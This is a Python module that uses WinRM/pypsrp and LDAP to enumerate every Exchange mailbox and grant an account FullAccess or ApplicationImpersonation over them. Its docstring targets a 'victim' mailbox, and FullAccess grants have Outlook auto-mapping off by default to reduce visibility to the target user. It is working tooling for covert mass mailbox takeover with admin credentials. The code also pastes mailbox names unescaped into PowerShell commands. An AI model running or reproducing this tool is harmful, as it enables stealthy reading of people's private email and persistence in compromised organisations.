"""
Exchange Admin Session
======================
Uses pypsrp (WinRM / PowerShell Remoting) to execute Exchange Management Shell
cmdlets from pure Python — no local PowerShell client required.

Typical usage
-------------
>>> from core.exchange_admin import ExchangeAdminSession
>>> admin = ExchangeAdminSession(
...     server="mail.example.com",
...     username="DOMAIN\\\\admin",
...     password="P@ssw0rd",
... )
>>> mailboxes = admin.enum_mailboxes()
>>> admin.grant_fullaccess("victim@example.com", "admin@example.com")
>>> admin.grant_impersonation("admin@example.com")
"""

from __future__ import annotations

import logging
from typing import Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Optional dependency guard
# ---------------------------------------------------------------------------
try:
    from pypsrp.client import Client  # type: ignore
    from pypsrp.powershell import PowerShell, RunspacePool  # type: ignore

    _PYPSRP_AVAILABLE = True
except ImportError:
    _PYPSRP_AVAILABLE = False


def _require_pypsrp() -> None:
    if not _PYPSRP_AVAILABLE:
        raise ImportError(
            "pypsrp is required for Exchange admin operations. "
            "Install it with: pip install pypsrp"
        )


# ---------------------------------------------------------------------------
# ExchangeAdminSession
# ---------------------------------------------------------------------------

class ExchangeAdminSession:
    """
    Connects to an Exchange server's Remote PowerShell endpoint via WinRM and
    executes Exchange Management Shell commands.

    Parameters
    ----------
    server : str
        Exchange server hostname or IP (e.g. ``mail.example.com``).
    username : str
        Account with Exchange admin rights.  Use ``DOMAIN\\\\user`` or
        ``user@domain.com`` format.
    password : str
        Plaintext password for the account.
    ssl : bool
        Whether to use HTTPS for WinRM.  Defaults to ``True``.
    ssl_verify : bool
        Verify the server TLS certificate.  Set ``False`` for self-signed
        certificates.  Defaults to ``False`` (common in on-prem Exchange).
    port : int | None
        WinRM port.  Defaults to 443 (HTTPS) or 80 (HTTP) automatically.
    auth : str
        WinRM authentication type: ``"negotiate"`` (default), ``"ntlm"``, ``"basic"``, ``"kerberos"``.
        Defaults to ``"negotiate"`` which uses SPNEGO and supports both NTLM and Kerberos.
    """

    def __init__(
        self,
        server: str,
        username: str,
        password: str,
        ssl: bool = True,
        ssl_verify: bool = False,
        port: Optional[int] = None,
        auth: str = "negotiate",
    ) -> None:
        _require_pypsrp()
        self.server = server
        self.username = username
        self.password = password
        self.ssl = ssl
        self.ssl_verify = ssl_verify
        self.auth = auth

        # Exchange Remote PowerShell is hosted by IIS (port 80/443), not
        # the WinRM listener (port 5985/5986). Use Exchange-appropriate defaults.
        if port is not None:
            self.port = port
        else:
            self.port = 443 if ssl else 80

        self._client: Optional[Client] = None

    # ------------------------------------------------------------------
    # Connection lifecycle
    # ------------------------------------------------------------------

    def _get_client(self) -> Client:
        if self._client is None:
            logger.info(
                "Connecting to Exchange PowerShell endpoint on %s:%s", self.server, self.port
            )
            self._client = Client(
                server=self.server,
                username=self.username,
                password=self.password,
                ssl=self.ssl,
                cert_validation=self.ssl_verify,
                port=self.port,
                auth=self.auth,
                # Exchange Remote PowerShell endpoint
                path="PowerShell",
                configuration_name="Microsoft.Exchange",
            )
        return self._client

    def close(self) -> None:
        """Close the underlying WinRM connection (if open)."""
        self._client = None

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _run_script(self, script: str) -> list:
        """
        Execute a PowerShell script string via WinRM and return the output
        objects as a list.

        Raises ``RuntimeError`` if the remote pipeline reported errors.
        """
        client = self._get_client()
        output, streams, had_errors = client.execute_ps(script)
        if streams.error:
            messages = [str(e) for e in streams.error]
            raise RuntimeError(
                f"Exchange PowerShell error(s):\n" + "\n".join(messages)
            )
        return output if output is not None else []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def enum_mailboxes(self) -> list[str]:
        """
        Return a list of all mailbox primary SMTP addresses in the organisation.

        Executes::

            Get-Mailbox -ResultSize Unlimited |
            Select-Object -ExpandProperty PrimarySmtpAddress
        """
        logger.info("Enumerating mailboxes (Get-Mailbox -ResultSize Unlimited)...")
        script = (
            "Get-Mailbox -ResultSize Unlimited | "
            "Select-Object -ExpandProperty PrimarySmtpAddress"
        )
        results = self._run_script(script)
        mailboxes = [str(r) for r in results if r]
        logger.info("Found %d mailboxes", len(mailboxes))
        return mailboxes

    def grant_fullaccess(
        self,
        target_mailbox: str,
        trustee_user: str,
        automapping: bool = False,
    ) -> None:
        """
        Grant *FullAccess* on ``target_mailbox`` to ``trustee_user``.

        Parameters
        ----------
        target_mailbox : str
            Primary SMTP address of the mailbox to grant access to.
        trustee_user : str
            The account that will receive the permission.
        automapping : bool
            Whether to auto-map the mailbox in Outlook.  Defaults to ``False``
            to reduce visibility in the target user's profile.
        """
        logger.info(
            "Granting FullAccess: %s -> %s (AutoMapping=%s)",
            trustee_user, target_mailbox, automapping,
        )
        automapping_str = "$true" if automapping else "$false"
        script = (
            f"Add-MailboxPermission "
            f"-Identity '{target_mailbox}' "
            f"-User '{trustee_user}' "
            f"-AccessRights FullAccess "
            f"-InheritanceType All "
            f"-AutoMapping {automapping_str} "
            f"-Confirm:$false"
        )
        self._run_script(script)
        logger.info("FullAccess granted: %s -> %s", trustee_user, target_mailbox)

    def grant_fullaccess_bulk(
        self,
        target_mailboxes: list[str],
        trustee_user: str,
        automapping: bool = False,
    ) -> dict[str, bool]:
        """
        Grant *FullAccess* on multiple mailboxes.

        Returns a dict mapping each target address to ``True`` (success) or
        ``False`` (failure).
        """
        results: dict[str, bool] = {}
        for mailbox in target_mailboxes:
            try:
                self.grant_fullaccess(mailbox, trustee_user, automapping=automapping)
                results[mailbox] = True
            except Exception as exc:
                logger.error("Failed to grant FullAccess on %s: %s", mailbox, exc)
                results[mailbox] = False
        return results

    def grant_impersonation(self, trustee_user: str, assignment_name: str = "") -> None:
        """
        Assign the ``ApplicationImpersonation`` management role to
        ``trustee_user``, allowing it to impersonate any mailbox via EWS.

        This is the prerequisite for Scheme B (EWS Impersonation).

        Parameters
        ----------
        trustee_user : str
            The account to receive the impersonation role.
        assignment_name : str
            Optional custom name for the role assignment.  Defaults to
            ``ImpersonationAssignment-<trustee_user>``.
        """
        if not assignment_name:
            # Sanitize username to create a valid assignment name
            safe_name = trustee_user.replace("@", "_at_").replace("\\", "_").replace("/", "_")
            assignment_name = f"ImpersonationAssignment-{safe_name}"

        logger.info(
            "Granting ApplicationImpersonation to %s (assignment: %s)",
            trustee_user, assignment_name,
        )
        script = (
            f"New-ManagementRoleAssignment "
            f"-Name '{assignment_name}' "
            f"-Role 'ApplicationImpersonation' "
            f"-User '{trustee_user}'"
        )
        self._run_script(script)
        logger.info("ApplicationImpersonation granted to %s", trustee_user)

    def revoke_impersonation(self, assignment_name: str) -> None:
        """Remove a previously created impersonation role assignment by name."""
        logger.info("Revoking role assignment: %s", assignment_name)
        script = (
            f"Remove-ManagementRoleAssignment "
            f"-Identity '{assignment_name}' "
            f"-Confirm:$false"
        )
        self._run_script(script)
        logger.info("Role assignment %s removed", assignment_name)

    def list_mailbox_permissions(self, target_mailbox: str) -> list[dict]:
        """
        Return a list of permission entries for ``target_mailbox``.

        Each entry is a dict with keys: ``User``, ``AccessRights``, ``IsInherited``.
        """
        script = (
            f"Get-MailboxPermission -Identity '{target_mailbox}' | "
            f"Select-Object User, AccessRights, IsInherited | "
            f"ConvertTo-Json -Depth 2"
        )
        import json

        client = self._get_client()
        output, streams, _ = client.execute_ps(script)
        raw = "".join(str(o) for o in output) if output else "[]"
        try:
            data = json.loads(raw)
            if isinstance(data, dict):
                data = [data]
            return data
        except json.JSONDecodeError:
            logger.warning("Could not parse mailbox permission output as JSON")
            return []


# ---------------------------------------------------------------------------
# LdapMailboxEnumerator  — LDAP-based mailbox enumeration (NTLM-friendly)
# ---------------------------------------------------------------------------

try:
    import ldap3  # type: ignore
    from ldap3 import Server as LdapServer, Connection as LdapConnection, NTLM, ALL, SUBTREE  # type: ignore

    _LDAP3_AVAILABLE = True
except ImportError:
    _LDAP3_AVAILABLE = False


class LdapMailboxEnumerator:
    """
    Query Active Directory over LDAP to enumerate mailbox-enabled users.

    Uses LDAP NTLM authentication — works from non-domain-joined machines
    and does not require Exchange Remote PowerShell or Kerberos.

    Detection criterion: users with ``msExchMailboxGuid`` attribute set are
    mailbox-enabled.  Primary SMTP address is read from ``proxyAddresses``
    (``SMTP:`` prefix = primary) with ``mail`` as fallback.

    Parameters
    ----------
    dc_host : str
        Domain controller IP or hostname.
    domain : str
        NETBIOS or FQDN domain name (e.g. ``randark.local`` or ``RANDARK``).
    username : str
        SAM account name without domain (e.g. ``Administrator``).
    password : str
        Plaintext password.
    port : int
        LDAP port.  Defaults to 389.
    use_ssl : bool
        Use LDAPS on port 636.  Defaults to ``False``.
    base_dn : str | None
        Search base DN.  Auto-derived from ``domain`` when ``None``.
    """

    def __init__(
        self,
        dc_host: str,
        domain: str,
        username: str,
        password: str,
        port: int = 389,
        use_ssl: bool = False,
        base_dn: Optional[str] = None,
    ) -> None:
        if not _LDAP3_AVAILABLE:
            raise ImportError("ldap3 is required for LDAP enumeration. Install it with: pip install ldap3")

        self.dc_host = dc_host
        self.domain = domain
        self.username = username
        self.password = password
        self.port = port
        self.use_ssl = use_ssl

        # Derive base DN from FQDN (randark.local -> DC=randark,DC=local)
        if base_dn:
            self.base_dn = base_dn
        else:
            fqdn = domain if "." in domain else domain  # best-effort
            self.base_dn = ",".join(f"DC={part}" for part in fqdn.split("."))

        self._conn: Optional[LdapConnection] = None

    def _get_conn(self) -> LdapConnection:
        if self._conn is None or not self._conn.bound:
            logger.info("Connecting to LDAP on %s:%s as %s\\%s", self.dc_host, self.port, self.domain, self.username)
            server = LdapServer(self.dc_host, port=self.port, use_ssl=self.use_ssl, get_info=ALL)
            ntlm_user = f"{self.domain}\\{self.username}"
            conn = LdapConnection(server, user=ntlm_user, password=self.password, authentication=NTLM, auto_bind=True)
            self._conn = conn
        return self._conn

    def close(self) -> None:
        if self._conn:
            self._conn.unbind()
            self._conn = None

    def enum_mailboxes(self) -> list[str]:
        """
        Return a list of primary SMTP addresses for all mailbox-enabled users.

        Searches for AD user objects that have ``msExchMailboxGuid`` set.
        Primary SMTP is derived from ``proxyAddresses`` (``SMTP:`` prefix)
        with ``mail`` attribute as fallback.
        """
        conn = self._get_conn()
        logger.info("Enumerating mailbox-enabled users via LDAP (base: %s)...", self.base_dn)

        conn.search(
            search_base=self.base_dn,
            search_filter="(&(objectClass=user)(msExchMailboxGuid=*))",
            search_scope=SUBTREE,
            attributes=["mail", "proxyAddresses", "sAMAccountName"],
        )

        mailboxes: list[str] = []
        for entry in conn.entries:
            # Prefer SMTP: prefixed primary address from proxyAddresses
            primary = None
            proxy = entry["proxyAddresses"].values if entry["proxyAddresses"] else []
            for addr in proxy:
                if addr.startswith("SMTP:"):  # uppercase = primary
                    primary = addr[5:]
                    break
            # Fallback to mail attribute
            if not primary and entry["mail"]:
                primary = str(entry["mail"])
            if primary:
                mailboxes.append(primary)

        logger.info("Found %d mailboxes via LDAP", len(mailboxes))
        return mailboxes
